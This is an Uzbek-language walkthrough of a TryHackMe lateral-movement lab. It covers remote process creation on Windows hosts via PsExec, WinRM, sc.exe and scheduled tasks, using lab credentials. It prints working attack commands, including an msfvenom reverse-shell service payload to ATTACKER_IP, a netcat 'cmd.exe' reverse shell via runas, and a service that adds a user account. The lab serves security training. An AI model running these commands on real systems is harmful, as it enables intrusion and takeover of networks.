### 🛠 Uzoqdan Process Ishga Tushurish (Remote Process Creation)

Ushbu topshiriqda hujumchilar tomonidan **to‘g‘ridan-to‘g‘ri masofaviy kompyuterlarda process ishga tushurish** uchun mavjud bo‘lgan usullar ko‘rib chiqiladi. Har bir texnika bir-biridan biroz farq qiladi, va ular ma'lum holatlarda yaxshiroq ishlashi mumkin.

---

## 1. **PsExec orqali ishga tushurish**

* **Portlar:** 445/TCP (SMB)
* **Talab qilinadigan guruh a’zoligi:** Administrators

**PsExec** uzoqdan buyruqlarni ishga tushurish uchun eng mashhur vositalardan biri bo‘lib, Sysinternals to‘plamiga kiradi.

PsExec ishlash tartibi:

1. `Admin$` bo‘lishuviga ulanib, servis faylini yuklaydi (`psexesvc.exe`).
2. Uzoq hostda `PSEXESVC` nomli servis yaratadi.
3. Named pipe'lar orqali `stdin/stdout/stderr` bilan aloqa o‘rnatadi.

**Buyruq namunasi:**

```bash
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

---

## 2. **WinRM orqali masofadan PowerShell komandalarini bajarish**

* **Portlar:** 5985/TCP (HTTP) yoki 5986/TCP (HTTPS)
* **Talab qilinadigan guruh a’zoligi:** Remote Management Users

**WinRM** bu veb asosidagi protokol bo‘lib, Windows hostlarga masofadan PowerShell komandalarini yuborish uchun ishlatiladi.

**Komandalar:**

✅ CMD orqali:

```bash
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

✅ PowerShell orqali:

```powershell
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Enter-PSSession -Computername TARGET -Credential $credential
```

✅ Skriptni masofaviy ishga tushurish:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock { whoami }
```

---

## 3. **SC.exe orqali masofaviy servis yaratish**

* **Portlar:**

  * 135/TCP, 49152-65535/TCP (DCE/RPC)
  * 445/TCP, 139/TCP (SMB named pipes orqali RPC)
* **Talab qilinadigan guruh a’zoligi:** Administrators

SC.exe yordamida **masofaviy servis** yaratib, unga istalgan komandani yuklab ishga tushurish mumkin.

**Namuna komandalar:**

```bash
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

**Servisni tozalash:**

```bash
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

---

## 4. **Scheduled Tasks yordamida hujum**

Windows'ning rejalashtirilgan vazifalar (scheduled tasks) funksiyasi orqali ham masofaviy komandani ishga tushirish mumkin.

**Vazifa yaratish:**

```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<komanda>" /sc ONCE /sd 01/01/1970 /st 00:00
```

**Vazifani ishga tushurish:**

```bash
schtasks /s TARGET /run /TN "THMtask1"
```

**Tozalash:**

```bash
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

---

## 🎯 Amaliy Vazifa

Sizga **THMJMP2** serveriga quyidagi credential yordamida ulanish topshiriladi:

```
User: ZA.TRYHACKME.COM\t1_leonard.summers  
Parol: EZpass4ever
```

SSH orqali ulanishingiz kerak:

```bash
ssh za\\<foydalanuvchi_nomi>@thmjmp2.za.tryhackme.com
```

Ushbu credential yordamida biz **THMIIS** serveriga `sc.exe` orqali hujum qilamiz. Boshqa usullarni ham sinab ko‘rishingiz mumkin.

---

## 🐚 Reverse Shell yaratish va ishga tushurish

**Step 1: Payload yaratish:**

```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

**Step 2: Payloadni THMIIS ga yuborish:**

```bash
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

**Step 3: Listener sozlash (msfconsole):**

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set LHOST lateralmovement
msf6 > set LPORT 4444
msf6 > set payload windows/shell/reverse_tcp
msf6 > exploit
```

**Yoki bir qatorli usul:**

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```

---

## 🔁 runas orqali ikkinchi reverse shell

PsExec, sc yoki boshqa vositalar credentialni to‘g‘ridan-to‘g‘ri uzatishni qo‘llab-quvvatlamagan holatda, `runas` yordamida yangi sessiya ochamiz:

```bash
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

> ⚠️ E’tibor bering: `runas /netonly` parolni tekshirmaydi — agar noto‘g‘ri kiritsangiz, keyinchalik ACCESS DENIED xatoliklarini ko‘rasiz.

**AttackBox'da listener ochamiz:**

```bash
nc -lvp 4443
```

---

## 💥 Service yaratish va ishga tushurish

```bash
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

> ✅ **Eslatma:** Boshqa foydalanuvchilar bilan laboratoriya ulashilgani uchun servis nomini `THMservice-<tasodifiy raqam>` shaklida berib, to‘qnashuvlardan saqlaning.

---

✅ Endi sizga `t1_leonard.summers` ish stolidagi **birinchi flag** reverse shell orqali ko‘rinadi.
